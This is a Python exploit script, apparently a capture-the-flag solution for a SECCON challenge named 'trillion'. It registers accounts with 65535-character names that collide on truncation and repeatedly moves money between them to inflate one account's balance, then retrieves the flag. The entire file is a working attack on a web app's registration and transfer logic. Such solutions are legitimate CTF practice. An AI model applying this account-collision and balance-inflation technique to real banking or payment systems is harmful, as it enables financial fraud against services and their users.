import asyncio
import aiohttp


BASE_URL = 'http://trillion.seccon.games:3000'  # Replace with the actual URL if different


async def register_user(name):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(f'{BASE_URL}/api/register', json={'name': name}) as response:
                if response.status != 200:
                    text = await response.text()
                    raise Exception(f"Registration failed: {response.status}, {text}")
                cookies = response.cookies
                session_cookie = cookies.get('session').value if 'session' in cookies else None
                return {'name': name, 'session_cookie': session_cookie}
    except Exception as e:
        print(f"Error registering user {name[-10:]}: {e}")
        return None


async def transfer_amount(session_cookie, recipient_name, amount):
    headers = {'Cookie': f'session={session_cookie}'}
    data = {'recipientName': recipient_name, 'amount': amount}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(f'{BASE_URL}/api/transfer', json=data, headers=headers) as response:
                if response.status != 200:
                    text = await response.text()
                    print(f"Transfer failed: {response.status}, {text}")
                    return None
                return await response.json()
    except Exception as e:
        print(f"Error during transfer to {recipient_name[-10:]}: {e}")
        return None


async def get_balance(session_cookie):
    headers = {'Cookie': f'session={session_cookie}'}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'{BASE_URL}/api/me', headers=headers) as response:
                if response.status != 200:
                    text = await response.text()
                    print(f"Failed to get balance: {response.status}, {text}")
                    return 0
                data = await response.json()
                return data.get('balance', 0)
    except Exception as e:
        print(f"Error getting balance: {e}")
        return 0


async def get_flag(session_cookie):
    headers = {'Cookie': f'session={session_cookie}'}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'{BASE_URL}/api/me', headers=headers) as response:
                if response.status != 200:
                    text = await response.text()
                    print(f"Failed to get flag: {response.status}, {text}")
                    return None
                data = await response.json()
                return data.get('flag', None)
    except Exception as e:
        print(f"Error getting flag: {e}")
        return None


async def main():
    # Step 1: Register 4 users with specific names
    names = ['f' * 65535 + char for char in ['1337', 'b', 'c', 'd']]
    users = []

    for name in names:
        user = await register_user(name)
        if user:
            users.append(user)
        else:
            print(f"Failed to register user: {name}")
            return

    # Step 2: Register a 5th user with name 'a' * 65535
    target_user_name = 'f' * 65535
    target_user = await register_user(target_user_name)
    if not target_user:
        print("Failed to register target user")
        return

    print("All users registered successfully.")

    # Step 3: Start 40 transfer cycles
    for cycle in range(45):
        print(f"Cycle {cycle + 1} started...")

        # Step 4: Check the balance of all users except the target user and user '1337'
        available_users = [user for user in users if not user['name'].endswith('1337')]
        while available_users:
            balances = []
            for user in available_users:
                balance = await get_balance(user['session_cookie'])
                balances.append({'user': user, 'balance': balance})

            # Step 5: Find the user with the highest balance among the available users
            max_balance_user = max(balances, key=lambda x: x['balance'])

            # Attempt transfer to the target user
            print(
                f"Attempting transfer from {max_balance_user['user']['name'][-10:]} "
                f"({max_balance_user['balance']}) to {target_user_name[-10:]}"
            )

            max_balance = max_balance_user['balance']
            if max_balance > 0:
                result = await transfer_amount(
                    max_balance_user['user']['session_cookie'], target_user_name, max_balance
                )
                if result:
                    print(f"Transfer successful from {max_balance_user['user']['name'][-10:]} to {target_user_name[-10:]}")
                    break
                else:
                    print(f"Transfer failed from {max_balance_user['user']['name'][-10:]}. Trying another user.")
                    available_users.remove(max_balance_user['user'])
            else:
                print(f"User {max_balance_user['user']['name'][-10:]} has no balance to transfer.")
                available_users.remove(max_balance_user['user'])

    print("All cycles completed. Final balances:")
    for user in users + [target_user]:
        balance = await get_balance(user['session_cookie'])
        print(f"User: {user['name'][-10:]}... Balance: {balance}")

    # Step 6: Get the flag for the target user
    flag = await get_flag(target_user['session_cookie'])
    if flag:
        print(f"Flag obtained: {flag}")
    else:
        print("No flag found for the target user.")


# Run the main function
asyncio.run(main())
